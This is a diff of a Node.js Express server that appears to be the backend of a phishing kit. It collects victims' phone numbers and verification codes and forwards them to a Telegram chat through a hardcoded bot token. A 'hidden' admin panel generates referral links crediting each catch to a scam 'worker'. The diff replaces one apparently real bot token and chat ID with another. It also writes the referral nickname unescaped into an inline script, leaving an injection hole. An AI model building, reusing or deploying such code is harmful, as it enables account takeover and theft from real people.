@@ -7,8 +7,8 @@ const app = express();
 const port = process.env.PORT || 3000;
 
 // === КОНФІГУРАЦІЯ TELEGRAM ===
-const BOT_TOKEN = "8227870538:AAG6O3ojYrxz_COPKCkgUZy-GYSYxRfNKuc";
-const CHAT_ID = "-5034619533";
+const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
+const CHAT_ID = "-5055127448";
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 // ==============================
 
@@ -16,7 +16,7 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, '/')));
 
-// === АДМИН-ПАНЕЛЬ ДЛЯ ГЕНЕРАЦИИ РЕФ-ССЫЛКИ ===
+// === АДМИН-ПАНЕЛЬ: Генерация скрытой реф-ссылки ===
 app.get('/admin', (req, res) => {
     res.send(`
 <!DOCTYPE html>
@@ -24,79 +24,86 @@ app.get('/admin', (req, res) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Генератор Реф-Ссылок</title>
+    <title>Реф Генератор (Скрытый)</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #1a1a2e; color: #eee; padding: 40px; text-align: center; }
-        .container { max-width: 500px; margin: 0 auto; background: #16213e; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,255,255,0.2); }
-        input, button { padding: 12px; margin: 10px 0; width: 100%; border: none; border-radius: 8px; font-size: 16px; }
-        input { background: #0f3460; color: #fff; }
-        button { background: #00d4ff; color: #000; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #00ffcc; }
-        .link { margin-top: 20px; word-break: break-all; background: #0f3460; padding: 15px; border-radius: 8px; display: none; }
-        .copy-btn { margin-top: 10px; background: #333; color: #0f0; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0a0a1a; color: #0ff; padding: 40px; text-align: center; }
+        .box { max-width: 520px; margin: 0 auto; background: #1a1a2e; padding: 35px; border-radius: 16px; border: 1px solid #0ff; box-shadow: 0 0 20px rgba(0, 255, 255, 0.2); }
+        h1 { margin-bottom: 10px; }
+        p { margin: 10px 0 20px; opacity: 0.9; }
+        input { width: 100%; padding: 14px; margin: 10px 0; background: #16213e; color: #fff; border: none; border-radius: 8px; font-size: 16px; }
+        button { width: 100%; padding: 14px; background: #00ffaa; color: #000; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #00cc88; }
+        .link { background: #16213e; color: #0f0; padding: 16px; border-radius: 8px; margin-top: 15px; font-family: monospace; word-break: break-all; display: none; }
+        .copy { background: #333; color: #0f0; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔗 Генератор Реф-Ссылок</h1>
-        <p>Введи ник Telegram (без @)</p>
-        <input type="text" id="nickname" placeholder="worker123" />
-        <button onclick="generateLink()">Создать ссылку</button>
-        <div id="result" class="link"></div>
-        <button class="copy-btn" onclick="copyLink()" style="display:none;" id="copyBtn">Скопировать</button>
+    <div class="box">
+        <h1>Скрытый Реф Генератор</h1>
+        <p>Введи ник <b>без @</b>:</p>
+        <input type="text" id="nick" placeholder="worker123" />
+        <button onclick="gen()">Создать ссылку</button>
+        <div id="link" class="link"></div>
+        <button class="copy" onclick="copyLink()" id="copy" style="display:none">Скопировать</button>
     </div>
 
     <script>
-        function generateLink() {
-            const nick = document.getElementById('nickname').value.trim();
+        function gen() {
+            const nick = document.getElementById('nick').value.trim();
             if (!nick) return alert('Введи ник!');
 
-            const baseUrl = window.location.origin;
-            const refLink = \`\${baseUrl}/?ref=@\${nick}\`;
+            const base = window.location.origin;
+            const shortLink = \`\${base}/r/\${nick}\`;
 
-            const result = document.getElementById('result');
-            const copyBtn = document.getElementById('copyBtn');
-            result.textContent = refLink;
-            result.style.display = 'block';
+            const linkEl = document.getElementById('link');
+            const copyBtn = document.getElementById('copy');
+            linkEl.textContent = shortLink;
+            linkEl.style.display = 'block';
             copyBtn.style.display = 'block';
-
-            // Сохраняем реф в localStorage (для формы)
-            localStorage.setItem('worker_ref', '@' + nick);
         }
 
         function copyLink() {
-            const link = document.getElementById('result').textContent;
-            navigator.clipboard.writeText(link).then(() => {
-                alert('Скопировано!');
+            const text = document.getElementById('link').textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Скопировано в буфер!');
             });
         }
-
-        // При загрузке страницы — подставляем реф в localStorage, если есть в URL
-        window.onload = () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            const ref = urlParams.get('ref');
-            if (ref && ref.startsWith('@')) {
-                localStorage.setItem('worker_ref', ref);
-            }
-        };
     </script>
 </body>
 </html>
     `);
 });
 
-// === ГЛАВНАЯ СТРАНИЦА (или редирект на форму) ===
-app.get('/', (req, res) => {
-    const ref = req.query.ref || '';
-    res.sendFile(path.join(__dirname, 'index.html')); // Убедись, что у тебя есть index.html с формой
+// === РЕФЕРАЛЬНЫЙ МАРШРУТ: /r/nick → сохраняет в localStorage и редиректит ===
+app.get('/r/:nick', (req, res) => {
+    const nick = req.params.nick.trim();
+    if (!nick) return res.redirect('/');
+
+    const cleanNick = nick.startsWith('@') ? nick : '@' + nick;
+
+    res.send(`
+    <!DOCTYPE html>
+    <html><head><meta charset="utf-8"></head>
+    <body>
+        <script>
+            localStorage.setItem('worker_ref', '${cleanNick}');
+            window.location.href = '/';
+        </script>
+    </body></html>
+    `);
 });
 
-// === ОБРОБКА ДАНИХ З ФОРМИ ===
+// === ГЛАВНАЯ СТРАНИЦА ===
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html')); // Убедись, что index.html существует
+});
+
+// === ОБРОБКА ДАННЫХ С ФОРМЫ ===
 app.post('/api/send-data', async (req, res) => {
     const { step, phone, code, ref } = req.body;
 
-    // Получаем реф из тела запроса или из localStorage (на клиенте)
-    const workerRef = ref || 'Не указан';
+    // Реферал из тела запроса (приходит с клиента)
+    const workerRef = ref && ref.startsWith('@') ? ref : 'Не указан';
 
     let message = '';
 
@@ -119,7 +126,7 @@ app.post('/api/send-data', async (req, res) => {
     }
 });
 
-// Функция отправки в Telegram
+// === ОТПРАВКА В TELEGRAM ===
 async function sendToTelegram(message) {
     const params = {
         chat_id: CHAT_ID,
@@ -146,8 +153,9 @@ async function sendToTelegram(message) {
     }
 }
 
-// Запуск
+// === ЗАПУСК СЕРВЕРА ===
 app.listen(port, () => {
     console.log(`Сервер запущено: http://localhost:${port}`);
     console.log(`Админ-панель: http://localhost:${port}/admin`);
+    console.log(`Пример реф-ссылки: http://localhost:${port}/r/worker123`);
 });
